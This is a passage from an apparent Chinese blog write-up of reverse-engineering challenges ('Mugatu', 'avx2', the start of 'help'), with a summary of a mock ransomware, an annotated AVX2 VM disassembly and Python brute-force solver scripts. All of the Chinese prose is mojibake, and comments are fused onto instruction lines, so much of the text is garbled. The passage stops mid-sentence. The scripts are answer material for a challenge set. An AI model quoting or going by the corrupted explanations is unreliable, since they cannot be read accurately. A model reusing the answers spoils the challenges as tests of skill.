len(passwd)])))</span><br><span class="line">    print(<span class="string">&quot;&quot;</span>.join(r))</span><br></pre></td></tr></table></figure><h2 id="10-Mugatu"><a href="#10-Mugatu" class="headerlink" title="10 -  Mugatu"></a>10 -  Mugatu</h2><p>ç¨‹åºåŠdllçš„IATé¡¹äº¤æ¢äº†ã€‚é™æ€çœ‹ä¸å‡ºåˆ°åº•è°ƒç”¨äº†ä»€ä¹ˆå‡½æ•°ï¼Œéœ€è¦è¿˜åŸã€‚</p><p>ç¨‹åºæ¨¡æ‹Ÿäº†å‹’ç´¢è½¯ä»¶ã€‚ä»twitterçš„RSSä¸­è·å–ä¿¡æ¯æ¥ç¼–ç ç›®æ ‡æœºçš„ç¯å¢ƒä¿¡æ¯ï¼Œç„¶åä¸Šä¼ ï¼Œå¾—åˆ°è¿”å›çš„åŠ å¯†å¯†é’¥ã€‚ç„¶åä»èµ„æºä¸­è·å–dllæ•°æ®ï¼Œå¹¶åŠ è½½åˆ°å†…å­˜ï¼Œæšä¸¾ç›˜ç¬¦ï¼Œæœç´¢really, really, really, ridiculously good looking gifsæ–‡ä»¶å¤¹ï¼Œå¹¶åŠ å¯†å…¶ä¸‹çš„gifæ–‡ä»¶ã€‚åŠ å¯†ç®—æ³•é‡‡ç”¨teaã€‚</p><p>è§£ç®—æ¯”è¾ƒç®€å•ã€‚å…ˆæŠŠå¦ä¸€å¼ å›¾ç‰‡è§£å¯†ï¼Œkeyåœ¨å…¶æ–‡ä»¶åä¸­å·²ç»ç»™å‡ºã€‚å¾—åˆ°ç¬¬äºŒç¬¬å›¾ç‰‡çš„keyçš„ç¬¬ä¸€ä¸ªå­—èŠ‚ã€‚é¢˜ç›®ä¸Šä¸­keyçš„é•¿åº¦æ˜¯4ä¸ªå­—èŠ‚ã€‚æ‰€ä»¥æ ¹æ®gifæ–‡ä»¶å¤´çˆ†ç ´ä¸‰ä¸ªå­—èŠ‚çš„keyï¼Œç„¶åè§£å¯†</p><h2 id="11-avx2"><a href="#11-avx2" class="headerlink" title="11 - avx2"></a>11 - avx2</h2><p>è€ƒå¯Ÿavx2æŒ‡ä»¤<br>VMä»£ç è§£æå¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br></pre></td><td class="code"><pre><span class="line">memset</span><br><span class="line">vmovdqu_mm ptr[0] , 0x0000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">vmovdqu_mm ptr[1] , 0x0000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">vmovdqu_mm ptr[3] , 0x1A1B1B1B1A13111111111111111111151A1B1B1B1A1311111111111111111115</span><br><span class="line">vmovdqu_mm ptr[4] , 0x1010101010101010080408040201101010101010101010100804080402011010</span><br><span class="line">vmovdqu_mm ptr[5] , 0x0000000000000000B9B9BFBF041310000000000000000000B9B9BFBF04131000</span><br><span class="line">vmovdqu_mm ptr[6] , 0x2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F</span><br><span class="line">vmovdqu_mm ptr[10] , 0x0140014001400140014001400140014001400140014001400140014001400140</span><br><span class="line">vmovdqu_mm ptr[11] , 0x0001100000011000000110000001100000011000000110000001100000011000</span><br><span class="line">vmovdqu_mm ptr[12] , 0xFFFFFFFF0C0D0E08090A040506000102FFFFFFFF0C0D0E08090A040506000102</span><br><span class="line">vmovdqu_mm ptr[13] , 0xFFFFFFFFFFFFFFFF000000060000000500000004000000020000000100000000</span><br><span class="line">vmovdqu_mm ptr[16] , 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF</span><br><span class="line">vmovdqu_mm ptr[17] , 0x6A09E667BB67AE853C6EF372A54FF53A510E527F9B05688C1F83D9AB5BE0CD19</span><br><span class="line">vmovdqu_mm ptr[18] , 0x428A2F9871374491B5C0FBCFE9B5DBA53956C25B59F111F1923F82A4AB1C5ED5</span><br><span class="line">vmovdqu_mm ptr[19] , 0x0000000300000002000000010000000000000007000000060000000500000004</span><br><span class="line">vmovdqu_mm ptr[20] , 0x0000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">vmovdqu_mm ptr[21] , 0x0000000100000001000000010000000100000001000000010000000100000001</span><br><span class="line">vmovdqu_mm ptr[22] , 0x0000000200000002000000020000000200000002000000020000000200000002</span><br><span class="line">vmovdqu_mm ptr[23] , 0x0000000300000003000000030000000300000003000000030000000300000003</span><br><span class="line">vmovdqu_mm ptr[24] , 0x0000000400000004000000040000000400000004000000040000000400000004</span><br><span class="line">vmovdqu_mm ptr[25] , 0x0000000500000005000000050000000500000005000000050000000500000005</span><br><span class="line">vmovdqu_mm ptr[26] , 0x0000000600000006000000060000000600000006000000060000000600000006</span><br><span class="line">vmovdqu_mm ptr[27] , 0x0000000700000007000000070000000700000007000000070000000700000007</span><br><span class="line">vpermd ptr[20] , ptr[0] , ptr[20]</span><br><span class="line">vpermd ptr[21] , ptr[0] , ptr[21]</span><br><span class="line">vpermd ptr[22] , ptr[0] , ptr[22]</span><br><span class="line">vpermd ptr[23] , ptr[0] , ptr[23]</span><br><span class="line">vpermd ptr[24] , ptr[0] , ptr[24]</span><br><span class="line">vpermd ptr[25] , ptr[0] , ptr[25]</span><br><span class="line">vpermd ptr[26] , ptr[0] , ptr[26]</span><br><span class="line">vpermd ptr[27] , ptr[0] , ptr[27]</span><br><span class="line">vpsrld ptr[7] , ptr[1] , 0x04</span><br><span class="line">vpxor ptr[28] , ptr[20] , ptr[21]</span><br><span class="line">vpxor ptr[28] , ptr[28] , ptr[22]</span><br><span class="line">vpxor ptr[28] , ptr[28] , ptr[23]</span><br><span class="line">vpxor ptr[28] , ptr[28] , ptr[24]</span><br><span class="line">vpxor ptr[28] , ptr[28] , ptr[25]</span><br><span class="line">vpxor ptr[28] , ptr[28] , ptr[26]</span><br><span class="line">vpxor ptr[28] , ptr[28] , ptr[27]</span><br><span class="line"></span><br><span class="line">vpand ptr[7] , ptr[7] , ptr[6]</span><br><span class="line"></span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x07ror 25</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x19</span><br><span class="line">vpor ptr[15] , ptr[29] , ptr[30]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpcmpeqb ptr[8] , ptr[1] , ptr[6]0</span><br><span class="line"></span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x15</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x0Bror 11</span><br><span class="line">vpor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpxor ptr[15] , ptr[15] , ptr[29](17 ror 25)  ^ (17 ror 11)</span><br><span class="line"></span><br><span class="line">vpcmpeqb ptr[8] , ptr[1] , ptr[6]0</span><br><span class="line"></span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x1A</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x06ror 6</span><br><span class="line">vpor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpxor ptr[15] , ptr[15] , ptr[29](17 ror 25)  ^ (17 ror 11) ^ (17 ror 6)</span><br><span class="line"></span><br><span class="line">vpxor ptr[29] , ptr[20] , ptr[16]</span><br><span class="line">vpand ptr[30] , ptr[20] , ptr[18]</span><br><span class="line">vpxor ptr[29] , ptr[29] , ptr[30]~ptr[20]^(ptr[20] &amp; ptr[18] &#x3D;&#x3D; ptr[18]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpaddd ptr[15] , ptr[29] , ptr[15](17 ror 25)  ^ (17 ror 11) ^ (17 ror 6) + (~ptr[20]^(ptr[20] &amp; ptr[18])</span><br><span class="line">vpaddd ptr[20] , ptr[15] , ptr[0](17 ror 25)  ^ (17 ror 11) ^ (17 ror 6) + (&#96;ptr[20]^(ptr[20] &amp; ptr[18]) + i1</span><br><span class="line">;vpaddb ptr[7] , ptr[8] , ptr[7]add 0</span><br><span class="line"></span><br><span class="line">vpxor ptr[29] , ptr[20] , ptr[28]</span><br><span class="line">vpermd ptr[17] , ptr[29] , ptr[19]low high swap 16bytes</span><br><span class="line"></span><br><span class="line">vpshufb ptr[7] , ptr[5] , ptr[7]7 &#x3D; i2 &gt;&gt; 4  and 6     5 shuf 7</span><br><span class="line"></span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x07</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x19</span><br><span class="line">vpor ptr[15] , ptr[29] , ptr[30]</span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x15</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x0B</span><br><span class="line">vpor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line">vpxor ptr[15] , ptr[15] , ptr[29]</span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x1A</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x06</span><br><span class="line">vpor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line">vpxor ptr[15] , ptr[15] , ptr[29](17 ror 25)  ^ (17 ror 11) ^ (17 ror 6)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpaddb ptr[2] , ptr[1] , ptr[7]2 &#x3D; 1 + 7   (7 &#x3D; i2 &lt;&lt; 4  and 6       5 shuf 7)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpxor ptr[29] , ptr[21] , ptr[16]</span><br><span class="line">vpand ptr[30] , ptr[21] , ptr[18]~ptr[21]^(ptr[21] &amp; ptr[18])</span><br><span class="line">vpxor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpaddd ptr[15] , ptr[29] , ptr[15]</span><br><span class="line">vpaddd ptr[21] , ptr[15] , ptr[0]~ptr[21]^(ptr[21] &amp; ptr[18]) + (17 ror 25)  ^ (17 ror 11) ^ (17 ror 6)  +  i1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpxor ptr[29] , ptr[21] , ptr[28]</span><br><span class="line">vpermd ptr[17] , ptr[29] , ptr[19]low high swap 16bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpxor ptr[20] , ptr[20] , ptr[21]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x07</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x19</span><br><span class="line">vpor ptr[15] , ptr[29] , ptr[30]</span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x15</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x0B</span><br><span class="line">vpor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line">vpxor ptr[15] , ptr[15] , ptr[29]</span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x1A</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x06</span><br><span class="line">vpor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line">vpxor ptr[15] , ptr[15] , ptr[29]17 ror 25)  ^ (17 ror 11) ^ (17 ror 6)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpmaddubsw ptr[7] , ptr[2] , ptr[10]     2 *+  10</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpxor ptr[29] , ptr[22] , ptr[16]</span><br><span class="line">vpand ptr[30] , ptr[22] , ptr[18]</span><br><span class="line">vpxor ptr[29] , ptr[29] , ptr[30]~ptr[22]^(ptr[22] &amp; ptr[18])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpaddd ptr[15] , ptr[29] , ptr[15]</span><br><span class="line">vpaddd ptr[22] , ptr[15] , ptr[0]</span><br><span class="line">vpxor ptr[29] , ptr[22] , ptr[28](17 ror 25)  ^ (17 ror 11) ^ (17 ror 6) + ~ptr[22]^(ptr[22] &amp; ptr[18]) + p1) ^ 28</span><br><span class="line">vpermd ptr[17] , ptr[29] , ptr[19]low high swap 16bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpxor ptr[20] , ptr[20] , ptr[22]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x07</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x19</span><br><span class="line">vpor ptr[15] , ptr[29] , ptr[30]</span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x15</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x0B</span><br><span class="line">vpor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line">vpxor ptr[15] , ptr[15] , ptr[29]</span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x1A</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x06</span><br><span class="line">vpor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line">vpxor ptr[15] , ptr[15] , ptr[29](17 ror 25)  ^ (17 ror 11) ^ (17 ror 6) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpmaddwd ptr[2] , ptr[7] , ptr[11]7 *+ 11</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpxor ptr[29] , ptr[23] , ptr[16]</span><br><span class="line">vpand ptr[30] , ptr[23] , ptr[18]</span><br><span class="line">vpxor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line">vpaddd ptr[15] , ptr[29] , ptr[15]</span><br><span class="line">vpaddd ptr[23] , ptr[15] , ptr[0]</span><br><span class="line">vpxor ptr[29] , ptr[23] , ptr[28]</span><br><span class="line">vpermd ptr[17] , ptr[29] , ptr[19](17 ror 25)  ^ (17 ror 11) ^ (17 ror 6) + ~ptr[23]^(ptr[23] &amp; ptr[18]) + p1) ^ 28</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpxor ptr[20] , ptr[20] , ptr[23]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x07</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x19</span><br><span class="line">vpor ptr[15] , ptr[29] , ptr[30]</span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x15</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x0B</span><br><span class="line">vpor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line">vpxor ptr[15] , ptr[15] , ptr[29]</span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x1A</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x06</span><br><span class="line">vpor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line">vpxor ptr[15] , ptr[15] , ptr[29]</span><br><span class="line">vpxor ptr[29] , ptr[24] , ptr[16]</span><br><span class="line">vpand ptr[30] , ptr[24] , ptr[18]</span><br><span class="line">vpxor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line">vpaddd ptr[15] , ptr[29] , ptr[15]</span><br><span class="line">vpaddd ptr[24] , ptr[15] , ptr[0]</span><br><span class="line">vpxor ptr[29] , ptr[24] , ptr[28]</span><br><span class="line">vpermd ptr[17] , ptr[29] , ptr[19](17 ror 25)  ^ (17 ror 11) ^ (17 ror 6) + ~ptr[24]^(ptr[24] &amp; ptr[18]) + p1) ^ 28</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpxor ptr[20] , ptr[20] , ptr[24]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x07</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x19</span><br><span class="line">vpor ptr[15] , ptr[29] , ptr[30]</span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x15</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x0B</span><br><span class="line">vpor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line">vpxor ptr[15] , ptr[15] , ptr[29]</span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x1A</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x06</span><br><span class="line">vpor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line">vpxor ptr[15] , ptr[15] , ptr[29]</span><br><span class="line">vpxor ptr[29] , ptr[25] , ptr[16]</span><br><span class="line">vpand ptr[30] , ptr[25] , ptr[18]</span><br><span class="line">vpxor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line">vpaddd ptr[15] , ptr[29] , ptr[15]</span><br><span class="line">vpaddd ptr[25] , ptr[15] , ptr[0]</span><br><span class="line">vpxor ptr[29] , ptr[25] , ptr[28]</span><br><span class="line">vpermd ptr[17] , ptr[29] , ptr[19](17 ror 25)  ^ (17 ror 11) ^ (17 ror 6) + ~ptr[25]^(ptr[25] &amp; ptr[18]) + p1) ^ 28</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpxor ptr[20] , ptr[20] , ptr[25]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpshufb ptr[2] , ptr[2] , ptr[12]2 shuf 12</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x07</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x19</span><br><span class="line">vpor ptr[15] , ptr[29] , ptr[30]</span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x15</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x0B</span><br><span class="line">vpor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line">vpxor ptr[15] , ptr[15] , ptr[29]</span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x1A</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x06</span><br><span class="line">vpor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line">vpxor ptr[15] , ptr[15] , ptr[29]</span><br><span class="line">vpxor ptr[29] , ptr[26] , ptr[16]</span><br><span class="line">vpand ptr[30] , ptr[26] , ptr[18]</span><br><span class="line">vpxor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line">vpaddd ptr[15] , ptr[29] , ptr[15]</span><br><span class="line">vpaddd ptr[26] , ptr[15] , ptr[0]17 ror 25)  ^ (17 ror 11) ^ (17 ror 6) + ~ptr[26]^(ptr[26] &amp; ptr[18]) + p1)</span><br><span class="line">vpxor ptr[29] , ptr[26] , ptr[28](17 ror 25)  ^ (17 ror 11) ^ (17 ror 6) + ~ptr[26]^(ptr[26] &amp; ptr[18]) + p1) ^ 28</span><br><span class="line"></span><br><span class="line">vpermd ptr[17] , ptr[29] , ptr[19]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpxor ptr[20] , ptr[20] , ptr[26]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x07</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x19</span><br><span class="line">vpor ptr[15] , ptr[29] , ptr[30]</span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x15</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x0B</span><br><span class="line">vpor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line">vpxor ptr[15] , ptr[15] , ptr[29]</span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x1A</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x06</span><br><span class="line">vpor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line">vpxor ptr[15] , ptr[15] , ptr[29]</span><br><span class="line"></span><br><span class="line">vpermd ptr[2] , ptr[2] , ptr[13]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpxor ptr[29] , ptr[27] , ptr[16]</span><br><span class="line">vpand ptr[30] , ptr[27] , ptr[18]</span><br><span class="line">vpxor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line">vpaddd ptr[15] , ptr[29] , ptr[15]</span><br><span class="line">vpaddd ptr[27] , ptr[15] , ptr[0](17 ror 25)  ^ (17 ror 11) ^ (17 ror 6) + ~ptr[27]^(ptr[27] &amp; ptr[18]) + p1) </span><br><span class="line">;vpxor ptr[29] , ptr[27] , ptr[28]</span><br><span class="line">;vpermd ptr[17] , ptr[29] , ptr[19]</span><br><span class="line">vpxor ptr[20] , ptr[20] , ptr[27]</span><br><span class="line"></span><br><span class="line">vmovdqu_mm ptr[19] , 0x0000000000000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF</span><br><span class="line">vpand ptr[20] , ptr[20] , ptr[19]</span><br><span class="line">vmovdqu_mm ptr[31] , 0x2176620C3A5C0F290B583618734F07102E332623780E59150C05172D4B1B1E22</span><br></pre></td></tr></table></figure><p>è¾“å…¥å‚å‘½ä»¤è¡Œå‚æ•°ä¼ é€’ã€‚ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•° 9å­—èŠ‚ï¼Œç¨‹åºä¸­æ˜¯æ˜æ–‡æ ¡éªŒã€‚ç¬¬äºŒä¸ªå‚æ•°32å­—èŠ‚ï¼Œé€šè¿‡åè§£VMä»£ç è·å¾—çš„ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">table &#x3D; map(ord,string.letters+string.digits)</span><br><span class="line">def crack(check):</span><br><span class="line">  t &#x3D; [0x00, 0x10, 0x13, 0x04, 0xBF, 0xBF, 0xB9, 0xB9]</span><br><span class="line">  for a in table:</span><br><span class="line">    for b in table:</span><br><span class="line">      for c in table:</span><br><span class="line">        for d in table:</span><br><span class="line">          a1 &#x3D; (t[a&gt;&gt;4]+a)&amp;0xff</span><br><span class="line">          b1 &#x3D; (t[b&gt;&gt;4]+b)&amp;0xff</span><br><span class="line">          c1 &#x3D; (t[c&gt;&gt;4]+c)&amp;0xff</span><br><span class="line">          d1 &#x3D; (t[d&gt;&gt;4]+d)&amp;0xff</span><br><span class="line">          if ((a1*0x40+b1)*0x1000+(c1*0x40+d1)) &amp;0xffffff &#x3D;&#x3D; check:</span><br><span class="line">            print &#39;&#39;.join(map(chr,[a,b,c,d]))</span><br><span class="line">            return</span><br><span class="line">  print &#39;nope&#39;</span><br><span class="line">  </span><br><span class="line">def main():</span><br><span class="line">  for i in [0x7070b2,0xac01d2,0x5e610a,0xa72aa8,0x081c86,0x1ae845,0xc829b2,0xf3a11e]:</span><br><span class="line">    crack(i)</span><br><span class="line">  print &#39;end.&#39;</span><br></pre></td></tr></table></figure><h2 id="12-help"><a href="#12-help" class="headerlink" title="12 help"></a>12 help</h2><p>12é¢˜å°±æ¯”è¾ƒè›‹ç–¼äº†â€¦æ˜¾ç¤ºå†…å­˜å–è¯ä¸æµé‡åˆ†æ</p><p>ç›®è¯´æ˜ä¸­è¯´ç¯å¢ƒcrashäº†ï¼Œç›´æ¥windbgåŠ è½½dmpæ–‡ä»¶ï¼Œ<code>!analyze -v</code>ï¼ŒåŸæ¥æ˜¯é©±åŠ¨man.syså¯¼è‡´çš„crashï¼ŒæŠŠman.sysæå‡ºæ¥ï¼ŒPEå¤´éƒ¨å·²ç»ä¸¢äº†ã€‚é‡Œé¢è¿˜æœ‰ä¸ªdllï¼Œæ 